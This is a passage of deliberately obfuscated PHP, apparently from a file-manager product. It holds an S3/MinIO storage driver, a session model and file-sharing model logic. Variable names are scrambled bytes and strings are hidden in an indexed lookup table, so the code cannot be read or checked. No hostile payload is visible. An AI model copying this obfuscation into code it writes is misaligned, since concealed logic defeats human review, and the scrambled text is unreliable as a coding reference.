public function getHost() { return parent::getHost() . $_SERVER[Ü©»’·][8] . $this->bucket; } public function size($Ï˜¼¤è) { $¯™¦Å¶¾ = $this->objectMeta($Ï˜¼¤è); return $¯™¦Å¶¾ ? $¯™¦Å¶¾[$_SERVER[Ü©»’·][76]] : 0; } public function info($¾ÅÇŞèŞ) { if ($this->isFolder($¾ÅÇŞèŞ)) { return $this->folderInfo($¾ÅÇŞèŞ); } else { if ($this->isFile($¾ÅÇŞèŞ)) { return $this->fileInfo($¾ÅÇŞèŞ); } } return !1; } public function exist($ã˜®ÜÎõ) { return $this->isFile($ã˜®ÜÎõ) || $this->isFolder($ã˜®ÜÎõ); } public function isFile($­£¹ıåÖ) { return !$this->isFolder($­£¹ıåÖ) && $this->objectMeta($­£¹ıåÖ); } public function isFolder($ùºÛòŸæ) { return $this->cacheMethod($_SERVER[Ü©»’·][165], $ùºÛòŸæ); } protected function objectMeta($ÀÃ ²´) { return $this->cacheMethod($_SERVER[Ü©»’·][167], $ÀÃ ²´); } protected function _objectMeta($İ³Š°€Š) { $­Ÿü˜¡Â =& $_SERVER[Ü©»’·]; $İ³Š°€Š = rtrim($İ³Š°€Š, $­Ÿü˜¡Â[8]); try { $Õ¸Ô÷ß = $this->client->getObjectInfo($this->bucket, $İ³Š°€Š); if (!isset($Õ¸Ô÷ß[$­Ÿü˜¡Â[221]]) && isset($Õ¸Ô÷ß[$­Ÿü˜¡Â[237]])) { $Õ¸Ô÷ß[$­Ÿü˜¡Â[221]] = $Õ¸Ô÷ß[$­Ÿü˜¡Â[237]]; } } catch (Exception $õëø¹¼) { $Õ¸Ô÷ß = !1; } if (!$Õ¸Ô÷ß) { } return $Õ¸Ô÷ß; } protected function _isFolder($·’…Íì¥) { $¶ï§‘ÀÏ =& $_SERVER[Ü©»’·]; $·’…Íì¥ = rtrim($·’…Íì¥, $¶ï§‘ÀÏ[8]); if ($·’…Íì¥ == $¶ï§‘ÀÏ[12] || $·’…Íì¥ == $¶ï§‘ÀÏ[8]) { return !0; } $»‘œÃ¹ = $this->client->getBucket($this->bucket, $·’…Íì¥, null, 1); if (empty($»‘œÃ¹[$¶ï§‘ÀÏ[204]])) { return !1; } $–ì†“Ş¨ = $»‘œÃ¹[$¶ï§‘ÀÏ[204]][0][$¶ï§‘ÀÏ[32]]; return stripos($–ì†“Ş¨, $·’…Íì¥ . $¶ï§‘ÀÏ[8]) === 0 ? !0 : !1; if (substr($–ì†“Ş¨, -1) == $¶ï§‘ÀÏ[8]) { return !0; } if (get_path_this($–ì†“Ş¨) == get_path_this($·’…Íì¥)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($ç·±£–ü) { parent::__construct($ç·±£–ü); $this->signatureVersion($_SERVER[Ü©»’·][216]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto dÕš¶‹İêß; F—ö’ÃÏ¢é: class SessionModel extends ModelBase { protected $tableName = "\163\171\x73\x74\x65\x6d\x5f\x73\145\163\x73\x69\157\156"; public function get($û¸Ÿ—¯À) { $ºáùç¬ô =& $_SERVER[Ü©»’·]; $³ıŞ¢ãÒ = $this->where(array($ºáùç¬ô[1993] => $û¸Ÿ—¯À))->find(); if (!is_array($³ıŞ¢ãÒ)) { return !1; } return $³ıŞ¢ãÒ[$ºáùç¬ô[761]]; } public function set($É°ä¬ü¦, $’ù×§°œ, $ş×ÓÀ³š = 3600) { $Ù“äáĞ­ =& $_SERVER[Ü©»’·]; $ÉØ È• = array($Ù“äáĞ­[1993] => $É°ä¬ü¦, $Ù“äáĞ­[1897] => $’ù×§°œ, $Ù“äáĞ­[1994] => $ş×ÓÀ³š + time()); if (Session::get($Ù“äáĞ­[1995])) { $ÉØ È•[$Ù“äáĞ­[1669]] = Session::get($Ù“äáĞ­[1995]); } else { $ÉØ È•[$Ù“äáĞ­[1669]] = 0; } if ($this->get($É°ä¬ü¦)) { return $this->where(array($Ù“äáĞ­[1993] => $É°ä¬ü¦))->save($ÉØ È•); } else { return $this->add($ÉØ È•, array(), !0); } } public function remove($Ç’°Ù®ƒ) { return $this->where(array($_SERVER[Ü©»’·][1993] => $Ç’°Ù®ƒ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[Ü©»’·][1996] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\141\162\145"; protected $dataAuto = array(array("\x6d\157\144\x69\x66\171\x54\x69\x6d\x65", "\x74\151\x6d\x65", "\151\x6e\x73\145\162\x74\54\165\160\x64\141\164\x65", "\x66\165\x6e\143\164\x69\x6f\156"), array("\x63\162\x65\x61\x74\145\x54\151\155\x65", "\x74\151\x6d\145", "\x69\156\x73\x65\x72\164", "\146\165\x6e\x63\164\151\x6f\x6e"), array("\157\160\164\151\x6f\x6e\x73", '', "\151\x6e\163\145\162\164\54\165\x70\x64\141\x74\x65\x2c\163\x65\x6c\x65\x63\164", "\152\163\157\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($³óË€®Õ) { $ĞşÙŸû° =& $_SERVER[Ü©»’·]; $É„¶Ü = isset($³óË€®Õ[0]) ? $³óË€®Õ[0] : !1; return array($ĞşÙŸû°[1997] => array(USER_ID, $ĞşÙŸû°[1998]), $ĞşÙŸû°[1938] => array($É„¶Ü, $ĞşÙŸû°[1999])); } protected function listSimple() { $¶á‹àÖ– = array($_SERVER[Ü©»’·][1669] => USER_ID); $æ––ğŞß = $this->field($this->fieldList)->where($¶á‹àÖ–)->select(); return $æ––ğŞß ? $æ––ğŞß : array(); } protected function getInfo($´«Öî–†, $ÖÚƒ®˜ä = false) { $±ä«×„¾ =& $_SERVER[Ü©»’·]; if ($ÖÚƒ®˜ä) { return $this->_getShareInfo(array($±ä«×„¾[498] => $´«Öî–†)); } $ºÂ‚…ü = $this->cacheFunctionGet($±ä«×„¾[1940], $´«Öî–†); return $ºÂ‚…ü; } public function getInfoByHash($øÎò¸Ñ») { return $this->_getShareInfo(array($_SERVER[Ü©»’·][500] => $øÎò¸Ñ»)); } public function getInfoByPath($ùÅÂ¡õÃ) { $Ãğ÷ğ¹Ø =& $_SERVER[Ü©»’·]; $ƒ…ÙŸ»´ = array($Ãğ÷ğ¹Ø[1669] => USER_ID, $Ãğ÷ğ¹Ø[411] => $ùÅÂ¡õÃ); return $this->_getShareInfo($ƒ…ÙŸ»´); } public function getInfoBySourcePath($®–›èª) { $ûŠŒÀÊ‘ =& $_SERVER[Ü©»’·]; $¦Î¡‘í‡ = array($ûŠŒÀÊ‘[1669] => USER_ID, $ûŠŒÀÊ‘[1179] => $®–›èª); return $this->_getShareInfo($¦Î¡‘í‡); } private function _getShareInfo($ĞæÚëØ) { $¦¤áÊ¤É =& $_SERVER[Ü©»’·]; $ş÷Ë½Ò = $this->where($ĞæÚëØ)->find(); if (!$ş÷Ë½Ò) { return !1; } $ĞæÚëØ = array($¦¤áÊ¤É[498] => $ş÷Ë½Ò[$¦¤áÊ¤É[498]]); $ÑÓ˜şÙ® = $¦¤áÊ¤É[2000]; $øÂ¹œˆÀ = Model($¦¤áÊ¤É[611])->order($¦¤áÊ¤É[408])->field($ÑÓ˜şÙ®)->where($ĞæÚëØ)->select(); if ($ş÷Ë½Ò[$¦¤áÊ¤É[411]] == $¦¤áÊ¤É[197]) { $ş÷Ë½Ò[$¦¤áÊ¤É[86]] = IO::info($ş÷Ë½Ò[$¦¤áÊ¤É[1179]]); } else { $ş÷Ë½Ò[$¦¤áÊ¤É[86]] = Model($¦¤áÊ¤É[1339])->pathInfo($ş÷Ë½Ò[$¦¤áÊ¤É[411]]); } $ş÷Ë½Ò[$¦¤áÊ¤É[2001]] = $øÂ¹œˆÀ; return $ş÷Ë½Ò; } protected function getInfoAuth($˜ÅÚ÷Ñö) { $ãéÜÎ†„ =& $_SERVER[Ü©»’·]; $ºÃ€‡¬Ğ = $this->getInfo($˜ÅÚ÷Ñö); if ($ºÃ€‡¬Ğ[$ãéÜÎ†„[1669]] == USER_ID) { $ºÃ€‡¬Ğ[$ãéÜÎ†„[422]] = $ºÃ€‡¬Ğ[$ãéÜÎ†„[86]][$ãéÜÎ†„[422]]; } else { $ºÃ€‡¬Ğ[$ãéÜÎ†„[422]] = Model($ãéÜÎ†„[511])->authMake($ºÃ€‡¬Ğ[$ãéÜÎ†„[2001]]); } return $ºÃ€‡¬Ğ; } protected function listData($®°›ÃŸ© = null, $Ôó˜“âÚ = 300) { $–Ğ™ôù· =& $_SERVER[Ü©»’·]; $â¦Ìº…é = array(array($–Ğ™ôù·[503] => array($–Ğ™ôù·[1015], 0), $–Ğ™ôù·[505] => array($–Ğ™ôù·[1015], 0), $–Ğ™ôù·[2002] => $–Ğ™ôù·[1956])); if ($®°›ÃŸ© == $–Ğ™ôù·[2003]) { $â¦Ìº…é = array($–Ğ™ôù·[503] => 1); } else { if ($®°›ÃŸ© == $–Ğ™ôù·[1164]) { $â¦Ìº…é = array($–Ğ™ôù·[505] => 1); } } $â¦Ìº…é[$–Ğ™ôù·[1669]] = USER_ID; $¿óÄß¶ = $this->where($â¦Ìº…é)->selectPage($Ôó˜“âÚ); return $¿óÄß¶; } protected function listToMe($×±ù¹¬ = 300) { $ÂÌí‡ˆÌ =& $_SERVER[Ü©»’·]; $ôÂè–ìã = Model($ÂÌí‡ˆÌ[2004])->userGroupParents(USER_ID); $á¬ÙŸ²â = array($ÂÌí‡ˆÌ[595] => SourceModel::TYPE_USER, $ÂÌí‡ˆÌ[514] => USER_ID); if ($ôÂè–ìã) { $á¬ÙŸ²â = array(array($ÂÌí‡ˆÌ[595] => SourceModel::TYPE_USER, $ÂÌí‡ˆÌ[514] => USER_ID), array($ÂÌí‡ˆÌ[595] => SourceModel::TYPE_GROUP, $ÂÌí‡ˆÌ[514] => array($ÂÌí‡ˆÌ[7], $ôÂè–ìã)), $ÂÌí‡ˆÌ[2002] => $ÂÌí‡ˆÌ[1956]); } $¦óêÎ€— = Model($ÂÌí‡ˆÌ[611])->where($á¬ÙŸ²â)->selectPage($×±ù¹¬); $³øÈ„†ˆ = array_to_keyvalue_group($¦óêÎ€—[$ÂÌí‡ˆÌ[378]], $ÂÌí‡ˆÌ[498]); if (!$³øÈ„†ˆ) { return $¦óêÎ€—; } $–”ô¯²û = $ÂÌí‡ˆÌ[2005]; $á¬ÙŸ²â = array($ÂÌí‡ˆÌ[498] => array($ÂÌí‡ˆÌ[427], array_keys($³øÈ„†ˆ)), $ÂÌí‡ˆÌ[1669] => array($ÂÌí‡ˆÌ[1017], $ÂÌí‡ˆÌ[197])); $û‡±Òö– = $this->field($–”ô¯²û)->where($á¬ÙŸ²â)->select(); foreach ($û‡±Òö– as $¹›¹˜Ş¶ => &$”Ë‚Àì„) { $”Ë‚Àì„[$ÂÌí‡ˆÌ[2001]] = $³øÈ„†ˆ[$”Ë‚Àì„[$ÂÌí‡ˆÌ[498]]]; } unset($”Ë‚Àì„); $€ƒÄÖùò = array($ÂÌí‡ˆÌ[2006] => $û‡±Òö–, $ÂÌí‡ˆÌ[2007] => $¦óêÎ€—[$ÂÌí‡ˆÌ[375]]); return $€ƒÄÖùò; } protected function shareAdd($—îĞ¬öµ, $·Úğä¯Ô) { $–çËÆÛ =& $_SERVER[Ü©»’·]; $àÚ“·ä = $this->_addShareData($—îĞ¬öµ, $·Úğä¯Ô); if (!empty($·Úğä¯Ô[$–çËÆÛ[2008]])) { $this->_shareAuthSet($àÚ“·ä, $·Úğä¯Ô[$–çËÆÛ[2008]]); } $this->shareEventAdd($—îĞ¬öµ, $·Úğä¯Ô, $–çËÆÛ[1167]); return $àÚ“·ä; } protected function shareAddSystem($Ë‹¥™¥, $“ååÀ¨•) { $Ö‚Ù­Ûî =& $_SERVER[Ü©»’·]; $Ë´ò²ó = $this->_addShareData($Ë‹¥™¥, $“ååÀ¨•, $Ö‚Ù­Ûî[1288]); $this->_shareAuthSet($Ë´ò²ó, $“ååÀ¨•[$Ö‚Ù­Ûî[2008]]); return $Ë´ò²ó; } private function shareEventAdd($èÏæ‰‰, $âÊŒÉáø, $Âüñ•‚Ì = "\x61\144\x64") { $¾×Ğ¡èä =& $_SERVER[Ü©»’·]; if (!$èÏæ‰‰ || $èÏæ‰‰ == $¾×Ğ¡èä[197]) { return; } if ($Âüñ•‚Ì == $¾×Ğ¡èä[1167]) { if ($âÊŒÉáø[$¾×Ğ¡èä[503]] == $¾×Ğ¡èä[88]) { Model($¾×Ğ¡èä[579])->eventShare($èÏæ‰‰, $¾×Ğ¡èä[2009]); } if ($âÊŒÉáø[$¾×Ğ¡èä[505]] == $¾×Ğ¡èä[88]) { Model($¾×Ğ¡èä[579])->eventShare($èÏæ‰‰, $¾×Ğ¡èä[2010]); } return; } $íÁ—áü = $this->getInfoByPath($èÏæ‰‰); $ÕÊ±µÕÓ = $¾×Ğ¡èä[2011]; if ($íÁ—áü[$¾×Ğ¡èä[503]] == $¾×Ğ¡èä[197] && $âÊŒÉáø[$¾×Ğ¡èä[503]] == $¾×Ğ¡èä[88]) { $ÕÊ±µÕÓ = $¾×Ğ¡èä[2009]; } if ($íÁ—áü[$¾×Ğ¡èä[503]] == $¾×Ğ¡èä[88] && $âÊŒÉáø[$¾×Ğ¡èä[503]] == $¾×Ğ¡èä[197]) { $ÕÊ±µÕÓ = $¾×Ğ¡èä[2012]; } if ($íÁ—áü[$¾×Ğ¡èä[505]] == $¾×Ğ¡èä[197] && $âÊŒÉáø[$¾×Ğ¡èä[505]] == $¾×Ğ¡èä[88]) { $ÕÊ±µÕÓ = $¾×Ğ¡èä[2010]; } if ($íÁ—áü[$¾×Ğ¡èä[505]] == $¾×Ğ¡èä[88] && $âÊŒÉáø[$¾×Ğ¡èä[505]] == $¾×Ğ¡èä[197]) { $ÕÊ±µÕÓ = $¾×Ğ¡èä[2013]; } Model($¾×Ğ¡èä[579])->eventShare($èÏæ‰‰, $ÕÊ±µÕÓ); return; } private function _addShareData($õŠ¥ÄŞ, $õš‹ùÇ = array(), $‘±È½ßš = false) { $´à±—Ô» =& $_SERVER[Ü©»’·]; $ ”ïçË÷ = $‘±È½ßš == $´à±—Ô»[1288] ? 0 : USER_ID; $àˆ°¶ƒ = array($´à±—Ô»[426] => $õŠ¥ÄŞ, $´à±—Ô»[1660] => $ ”ïçË÷); if ($õŠ¥ÄŞ == 0) { $àˆ°¶ƒ = array($´à±—Ô»[2014] => $õš‹ùÇ[$´à±—Ô»[1179]], $´à±—Ô»[1660] => $ ”ïçË÷); } if ($—äÙ×÷¼ = $this->where($àˆ°¶ƒ)->find()) { return $—äÙ×÷¼[$´à±—Ô»[498]]; } if ($õŠ¥ÄŞ == 0) { $‘Øâ°‚ = array($´à±—Ô»[32] => get_path_this($õš‹ùÇ[$´à±—Ô»[84]])); } else { $‘Øâ°‚ = Model($´à±—Ô»[831])->sourceInfo($õŠ¥ÄŞ); if (!$‘Øâ°‚) { return !1; } } if (!$õš‹ùÇ[$´à±—Ô»[1567]]) { $õš‹ùÇ[$´à±—Ô»[1567]] = $‘Øâ°‚[$´à±—Ô»[32]]; } $ğÛí˜öï = array($´à±—Ô»[1660] => $ ”ïçË÷, $´à±—Ô»[426] => $õŠ¥ÄŞ, $´à±—Ô»[1567] => $´à±—Ô»[12], $´à±—Ô»[503] => 0, $´à±—Ô»[505] => 0, $´à±—Ô»[1179] => $´à±—Ô»[12], $´à±—Ô»[307] => $´à±—Ô»[12], $´à±—Ô»[892] => $´à±—Ô»[12], $´à±—Ô»[2015] => 0, $´à±—Ô»[2016] => 0, $´à±—Ô»[506] => 0, $´à±—Ô»[507] => $´à±—Ô»[12], $´à±—Ô»[500] => $´à±—Ô»[12]); $İÅè˜›Ñ = explode($´à±—Ô»[50], $´à±—Ô»[2017]); foreach ($İÅè˜›Ñ as $ÂœÓ—Ñ›) { if (!isset($õš‹ùÇ[$ÂœÓ—Ñ›])) { continue; } $ğÛí˜öï[$ÂœÓ—Ñ›] = $õš‹ùÇ[$ÂœÓ—Ñ›]; } $§Û–šª‚ = $this->add($ğÛí˜öï); $©Ğ€şÔÌ = array($´à±—Ô»[500] => short_id($§Û–šª‚)); $this->where(array($´à±—Ô»[497] => $§Û–šª‚))->save($©Ğ€şÔÌ); return $§Û–šª‚; } private function _shareAuthSet($À¨ë¾¯Ş, $Ùüé …) { $ÏîªÑÙ =& $_SERVER[Ü©»’·]; if (!is_array($Ùüé …)) { return !1; } $ƒúÙïÉ– = Model($ÏîªÑÙ[1966]); $ƒúÙïÉ–->where(array($ÏîªÑÙ[498] => $À¨ë¾¯Ş))->delete(); $Œµ¡‚Ñ = array(); foreach ($Ùüé … as $¸¹°”Ç) { $ğõÔ´£Õ = SourceModel::TYPE_USER; if ($¸¹°”Ç[$ÏîªÑÙ[420]] == SourceModel::TYPE_GROUP) { $ğõÔ´£Õ = SourceModel::TYPE_GROUP; } $ÆüÇÉ¡î = array($ÏîªÑÙ[498] => $À¨ë¾¯Ş, $ÏîªÑÙ[420] => $ğõÔ´£Õ, $ÏîªÑÙ[514] => intval($¸¹°”Ç[$ÏîªÑÙ[514]]), $ÏîªÑÙ[1962] => 0, $ÏîªÑÙ[2018] => -1); if ($¸¹°”Ç[$ÏîªÑÙ[1962]]) { $ÆüÇÉ¡î[$ÏîªÑÙ[1962]] = $¸¹°”Ç[$ÏîªÑÙ[1962]]; } else { if ($¸¹°”Ç[$ÏîªÑÙ[2018]]) { $ÆüÇÉ¡î[$ÏîªÑÙ[2018]] = $¸¹°”Ç[$ÏîªÑÙ[2018]]; } } $Œµ¡‚Ñ[] = $ÆüÇÉ¡î; } return $ƒúÙïÉ–->addAll($Œµ¡‚Ñ, array(), !0); } public function numViewAdd($­ô„­Ä³) { $áÛëù¿ =& $_SERVER[Ü©»’·]; $°„ÑÄŠä = array($áÛëù¿[497] => $­ô„­Ä³); $this->where($°„ÑÄŠä)->setAdd($áÛëù¿[2015]); } public function numDownloadAdd($Îæ±æºÒ) { $ÃÔƒÏüœ =& $_SERVER[Ü©»’·]; $Ëø–Óùõ = array($ÃÔƒÏüœ[497] => $Îæ±æºÒ); $this->where($Ëø–Óùõ)->setAdd($ÃÔƒÏüœ[2016]); } protected function shareEdit($¼Ğ€…®, $åœšùËê) { $Üşƒ”˜£ =& $_SERVER[Ü©»’·]; $âƒ«ãÍ = $this->getInfo($¼Ğ€…®); if (!$âƒ«ãÍ) { return !1; } $this->_checkLinkShare($åœšùËê, $âƒ«ãÍ); $çÆÌÂŸŞ = array(); $ĞÅ½‰Â = explode($Üşƒ”˜£[50], $Üşƒ”˜£[2019]); foreach ($ĞÅ½‰Â as $ØÒ„û¯•) { if (!array_key_exists($ØÒ„û¯•, $åœšùËê)) { continue; } $çÆÌÂŸŞ[$ØÒ„û¯•] = $åœšùËê[$ØÒ„û¯•]; } $this->shareEventAdd($âƒ«ãÍ[$Üşƒ”˜£[411]], $åœšùËê, $Üşƒ”˜£[1828]); $this->where(array($Üşƒ”˜£[497] => $¼Ğ€…®))->save($çÆÌÂŸŞ); if (isset($åœšùËê[$Üşƒ”˜£[2008]])) { $this->_shareAuthSet($¼Ğ€…®, $åœšùËê[$Üşƒ”˜£[2008]]); } return !0; } private function _checkLinkShare($Ã“¹µôÎ, $ÎŠ³®Ãí) { $Î›„Éù¶ =& $_SERVER[Ü©»’·]; if ($Ã“¹µôÎ[$Î›„Éù¶[503]] != $Î›„Éù¶[88]) { return; } $¯ºÂññ· = $ÎŠ³®Ãí[$Î›„Éù¶[86]][$Î›„Éù¶[411]]; if ($ÎŠ³®Ãí[$Î›„Éù¶[86]][$Î›„Éù¶[33]] != $Î›„Éù¶[199]) { $åÓäôòÈ = $this->_folderReport($¯ºÂññ·); if (!$åÓäôòÈ) { return; } show_json(LNG($Î›„Éù¶[2020]) . $Î›„Éù¶[2021] . $åÓäôòÈ, !1); } $˜éæ§‰ = Model($Î›„Éù¶[831])->fileInfoGet($ÎŠ³®Ãí[$Î›„Éù¶[86]][$Î›„Éù¶[411]]); if (!$˜éæ§‰) { return; } $—ÂÂÌ¸ï = $this->shareFileMeta($˜éæ§‰[$Î›„Éù¶[477]]); if (isset($—ÂÂÌ¸ï[$Î›„Éù¶[383]]) && $—ÂÂÌ¸ï[$Î›„Éù¶[383]] == $Î›„Éù¶[88]) { show_json(LNG($Î›„Éù¶[2022]), !1); } } private function _folderReport($äİç™µ) { $¿•°ùÅ =& $_SERVER[Ü©»’·]; $÷È¿ñ = array($¿•°ùÅ[477] => array($¿•°ùÅ[1015], 0), $¿•°ùÅ[756] => 3); $¤æ§™½ = Model($¿•°ùÅ[2023])->where($÷È¿ñ)->field($¿•°ùÅ[477])->select(); if (!$¤æ§™½) { return !1; } $¤æ§™½ = array_to_keyvalue($¤æ§™½, $¿•°ùÅ[12], $¿•°ùÅ[477]); $ŸÄà—‰å = $¿•°ùÅ[50] . $äİç™µ . $¿•°ùÅ[50]; $÷È¿ñ = array($¿•°ùÅ[477] => array($¿•°ùÅ[7], $¤æ§™½), $¿•°ùÅ[530] => array($¿•°ùÅ[392], "\45{$ŸÄà—‰å}\x25"), $¿•°ùÅ[440] => 0); $ïÒÚöçå = Model($¿•°ùÅ[831])->where($÷È¿ñ)->field($¿•°ùÅ[2024])->find(); if (!$ïÒÚöçå) { return !1; } $¹’Ïòõ© = substr($ïÒÚöçå[$¿•°ùÅ[530]], strpos($ïÒÚöçå[$¿•°ùÅ[530]], $ŸÄà—‰å)); $÷È¿ñ = array($¿•°ùÅ[411] => array($¿•°ùÅ[7], trim($¹’Ïòõ©, $¿•°ùÅ[50]))); $¦¨¹®§Í = Model($¿•°ùÅ[831])->where($÷È¿ñ)->field($¿•°ùÅ[32])->select(); $Œ„­úöÏ = array_to_keyvalue($¦¨¹®§Í, $¿•°ùÅ[12], $¿•°ùÅ[32]); $Œ„­úöÏ[] = $ïÒÚöçå[$¿•°ùÅ[32]]; return implode($¿•°ùÅ[8], $Œ„­úöÏ); } protected function remove($‹¶åœŒ) { $ôÅ­‡ÆÂ =& $_SERVER[Ü©»’·]; if (is_array($‹¶åœŒ)) { $‹¶åœŒ = array($ôÅ­‡ÆÂ[7], $‹¶åœŒ); } $óú¯‰³ğ = array($ôÅ­‡ÆÂ[498] => $‹¶åœŒ); $Ê¶›«íÖ = $this->where($óú¯‰³ğ)->delete(); if ($Ê¶›«íÖ) { Model($ôÅ­‡ÆÂ[611])->where(array($ôÅ­‡ÆÂ[498] => $‹¶åœŒ))->delete(); } $¦½Ñ©‡Í = is_array($‹¶åœŒ) ? $‹¶åœŒ[1] : array($‹¶åœŒ); for ($Ó‡İã = 0; $Ó‡İã < count($¦½Ñ©‡Í); $Ó‡İã++) { $£‰´–äõ = $this->getInfo($¦½Ñ©‡Í[$Ó‡İã]); if ($£‰´–äõ[$ôÅ­‡ÆÂ[505]] == $ôÅ­‡ÆÂ[88]) { Model($ôÅ­‡ÆÂ[579])->eventShare($£‰´–äõ[$ôÅ­‡ÆÂ[411]], $ôÅ­‡ÆÂ[2013]); } if ($£‰´–äõ[$ôÅ­‡ÆÂ[503]] == $ôÅ­‡ÆÂ[88]) { Model($ôÅ­‡ÆÂ[579])->eventShare($£‰´–äõ[$ôÅ­‡ÆÂ[411]], $ôÅ­‡ÆÂ[2012]); } } return $Ê¶›«íÖ; } protected function removeBySource($ã‚…È¼Û) { $à°µŠ¶ =& $_SERVER[Ü©»’·]; $ôô·²±æ = array($à°µŠ¶[426] => array($à°µŠ¶[427], $ã‚…È¼Û)); $ßö¿¤« = $this->field($à°µŠ¶[498])->where($ôô·²±æ)->select(); $ßö¿¤« = array_to_keyvalue($ßö¿¤«, $à°µŠ¶[12], $à°µŠ¶[498]); if (!$ßö¿¤«) { return; } $ôô·²±æ = array($à°µŠ¶[497] => array($à°µŠ¶[427], $ßö¿¤«)); $this->where($ôô·²±æ)->delete(); Model($à°µŠ¶[611])->where($ôô·²±æ)->delete(); } public function listAll($¼âÌĞ€) { $ü¤ÔĞ =& $_SERVER[Ü©»’·]; $ÛğãÄÓ‹ = array(); if ($¼âÌĞ€[$ü¤ÔĞ[1669]]) { $ÛğãÄÓ‹[$ü¤ÔĞ[1669]] = $¼âÌĞ€[$ü¤ÔĞ[1669]]; } if ($¼âÌĞ€[$ü¤ÔĞ[767]]) { $êŸ×‡Õ• = $¼âÌĞ€[$ü¤ÔĞ[506]] ? $¼âÌĞ€[$ü¤ÔĞ[506]] : strtotime(date($ü¤ÔĞ[2025])); $ÛğãÄÓ‹[$ü¤ÔĞ[200]] = array($ü¤ÔĞ[333], array($¼âÌĞ€[$ü¤ÔĞ[767]], $êŸ×‡Õ•)); } if ($¼âÌĞ€[$ü¤ÔĞ[33]]) { $ÛğãÄÓ‹[$¼âÌĞ€[$ü¤ÔĞ[33]]] = 1; } else { $ÛğãÄÓ‹[] = array($ü¤ÔĞ[503] => array($ü¤ÔĞ[1015], 0), $ü¤ÔĞ[505] => array($ü¤ÔĞ[1015], 0), $ü¤ÔĞ[2002] => $ü¤ÔĞ[1956]); } if ($¼âÌĞ€[$ü¤ÔĞ[1952]]) { $ÛğãÄÓ‹[] = array($ü¤ÔĞ[500] => $¼âÌĞ€[$ü¤ÔĞ[1952]], $ü¤ÔĞ[1567] => array($ü¤ÔĞ[392], "\45{$¼âÌĞ€[$ü¤ÔĞ[1952]]}\45"), $ü¤ÔĞ[2002] => $ü¤ÔĞ[1956]); } $ÚÉ†÷ÚÃ = $this->_makeOrder()->where($ÛğãÄÓ‹)->selectPage(20); if (empty($ÚÉ†÷ÚÃ[$ü¤ÔĞ[378]])) { return array(); } $this->_listDataApply($ÚÉ†÷ÚÃ[$ü¤ÔĞ[378]]); return $ÚÉ†÷ÚÃ; } public function listDataApply($¸şÁµÅş) { $this->_listDataApply($¸şÁµÅş); return $¸şÁµÅş; } private function _listDataApply(&$ò–òÀÁ›) { $èÑÒş‘¸ =& $_SERVER[Ü©»’·]; $£ıíÊê = array_to_keyvalue($ò–òÀÁ›, $èÑÒş‘¸[12], $èÑÒş‘¸[1669]); $ˆœªä¶³ = Model($èÑÒş‘¸[544])->userListInfo(array_unique($£ıíÊê)); $çı£öĞè = array_to_keyvalue($ò–òÀÁ›, $èÑÒş‘¸[12], $èÑÒş‘¸[411]); $ƒÇò‚ú = Model($èÑÒş‘¸[831])->sourceListInfo($çı£öĞè, !0); foreach ($ò–òÀÁ› as $®¹Ô´†™ => &$˜ğ¯ÇÕ¤) { $ş¡äã·· = $˜ğ¯ÇÕ¤[$èÑÒş‘¸[1669]]; $˜ğ¯ÇÕ¤[$èÑÒş‘¸[2026]] = $ˆœªä¶³[$ş¡äã··] ? $ˆœªä¶³[$ş¡äã··] : !1; $’…î Ê = $˜ğ¯ÇÕ¤[$èÑÒş‘¸[411]]; $˜ğ¯ÇÕ¤[$èÑÒş‘¸[86]] = $ƒÇò‚ú[$’…î Ê] ? $ƒÇò‚ú[$’…î Ê] : !1; if ($˜ğ¯ÇÕ¤[$èÑÒş‘¸[86]][$èÑÒş‘¸[440]] == $èÑÒş‘¸[88]) { unset($ò–òÀÁ›[$®¹Ô´†™]); } if ($˜ğ¯ÇÕ¤[$èÑÒş‘¸[86]] != $èÑÒş‘¸[197] && !$˜ğ¯ÇÕ¤[$èÑÒş‘¸[86]]) { unset($ò–òÀÁ›[$®¹Ô´†™]); } } unset($˜ğ¯ÇÕ¤); $ò–òÀÁ› = array_values($ò–òÀÁ›); } private function _makeOrder($ÛµÎµôú = '') { $â‰×±Şæ =& $_SERVER[Ü©»’·]; $ ª£èáÖ = array($â‰×±Şæ[200], $â‰×±Şæ[506], $â‰×±Şæ[2015], $â‰×±Şæ[2016]); $Ëñ®ï¡¢ = array($â‰×±Şæ[459] => $â‰×±Şæ[460], $â‰×±Şæ[461] => $â‰×±Şæ[462]); $ñÑş¬ó± = Input::get($â‰×±Şæ[466], $â‰×±Şæ[7], $â‰×±Şæ[432], $ ª£èáÖ); $ˆ£İ©â = Input::get($â‰×±Şæ[467], $â‰×±Şæ[7], $â‰×±Şæ[2027], array($â‰×±Şæ[1949], $â‰×±Şæ[461])); $ˆ£İ©â = $Ëñ®ï¡¢[$ˆ£İ©â]; $ÛµÎµôú = $ÛµÎµôú . "{$ñÑş¬ó±}\x20{$ˆ£İ©â}"; return $this->order($ÛµÎµôú); } public function reportAdd($Ô¢ô…Ü) { $×¡è‘›Œ =& $_SERVER[Ü©»’·]; $šƒÚàï½ = array($×¡è‘›Œ[498] => $Ô¢ô…Ü[$×¡è‘›Œ[498]], $×¡è‘›Œ[1669] => USER_ID); if (Model($×¡è‘›Œ[2023])->where($šƒÚàï½)->find()) { return !1; } $†Ó¤ = array($×¡è‘›Œ[498] => $Ô¢ô…Ü[$×¡è‘›Œ[498]], $×¡è‘›Œ[1567] => $Ô¢ô…Ü[$×¡è‘›Œ[1567]], $×¡è‘›Œ[411] => $Ô¢ô…Ü[$×¡è‘›Œ[411]], $×¡è‘›Œ[477] => $Ô¢ô…Ü[$×¡è‘›Œ[477]], $×¡è‘›Œ[1669] => USER_ID, $×¡è‘›Œ[33] => $Ô¢ô…Ü[$×¡è‘›Œ[33]], $×¡è‘›Œ[462] => $Ô¢ô…Ü[$×¡è‘›Œ[462]]); return Model($×¡è‘›Œ[2023])->add($†Ó¤); } public function reportList($æ—òÉé) { $‡…„Êè· =& $_SERVER[Ü©»’·]; $Ö ¬ºì¬ = array(); if ($æ—òÉé[$‡…„Êè·[767]]) { $†ÈÈ‹ŞÖ = $æ—òÉé[$‡…„Êè·[506]] ? $æ—òÉé[$‡…„Êè·[506]] : strtotime(date($‡…„Êè·[2025])); $Ö ¬ºì¬[$‡…„Êè·[200]] = array($‡…„Êè·[333], array($æ—òÉé[$‡…„Êè·[767]], 